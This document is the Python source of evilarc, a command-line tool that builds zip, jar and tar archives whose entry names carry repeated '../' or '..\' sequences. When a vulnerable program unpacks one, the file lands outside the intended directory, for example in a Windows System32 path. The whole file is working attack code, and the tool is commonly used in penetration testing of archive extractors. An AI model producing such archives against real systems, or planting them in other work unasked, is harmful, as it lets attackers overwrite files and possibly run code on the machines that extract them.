#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
# Copyright (c) 2009, Neohapsis, Inc.
# All rights reserved.
#
# Implementation by Greg Ose and Patrick Toomey
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
#  - Redistributions of source code must retain the above copyright notice, this list
#    of conditions and the following disclaimer.
#  - Redistributions in binary form must reproduce the above copyright notice, this
#    list of conditions and the following disclaimer in the documentation and/or
#    other materials provided with the distribution.
#  - Neither the name of Neohapsis nor the names of its contributors may be used to
#    endorse or promote products derived from this software without specific prior
#    written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR
# ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON
# ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""
import sys
import zipfile
import tarfile
import os
import argparse


def parse_arguments():
    """parse CLI arguments"""
    parser = argparse.ArgumentParser(
        description='Create archive containing a file with directory traversal',
        prog='evilarc',
        epilog='Version: 0.1',
        usage='%(prog)s [options] <input file>'
    )
    parser.add_argument(
        '-f', '--output-file',
        help="File to output archive to. \
             Archive type is based off of file extension. \
             Supported extensions zip, jar, tar, tar.bz2, tar.gz, and tgz. \
             Defaults to evil.zip.",
        dest="out", default="evil.zip"
    )
    parser.add_argument(
        '-d', '--depth',
        help="Number directories to traverse. Defaults to 8.",
        type=int, dest="depth", default=8
    )
    parser.add_argument(
        '-o', '--os',
        help="OS platform for archive (win|unix). Defaults to win.",
        dest="platform", default="win"
    )
    parser.add_argument(
        '-p', '--path',
        help="Path to include in filename after traversal. \
             Ex: WINDOWS\\System32\\",
        dest="path", default=""
    )
    return parser.parse_known_args()


def main(argv=sys.argv):
    options, arguments = parse_arguments()

    if len(arguments) != 1:
        sys.exit("Incorrect arguments")

    filename = arguments[0]
    if not os.path.exists(filename):
        sys.exit("Invalid input file")

    if options.platform == "win":
        dir = "..\\"
        if options.path and options.path[-1] != '\\':
            options.path += '\\'
    else:
        dir = "../"
        if options.path and options.path[-1] != '/':
            options.path += '/'

    zpath = dir * options.depth + options.path + os.path.basename(filename)
    print(f"Creating {options.out} containing {zpath}")
    ext = os.path.splitext(options.out)[1]
    if os.path.exists(options.out):
        wmode = 'a'
    else:
        wmode = 'w'
    if ext == ".zip" or ext == ".jar":
        zf = zipfile.ZipFile(options.out, wmode)
        zf.write(filename, zpath)
        zf.close()
        return
    elif ext == ".tar":
        mode = wmode
    elif ext == ".gz" or ext == ".tgz":
        mode = "w:gz"
    elif ext == ".bz2":
        mode = "w:bz2"
    else:
        sys.exit(f"Could not identify output archive format for {ext}")

    tf = tarfile.open(options.out, mode)
    tf.add(filename, zpath)
    tf.close()


if __name__ == '__main__':
    main()
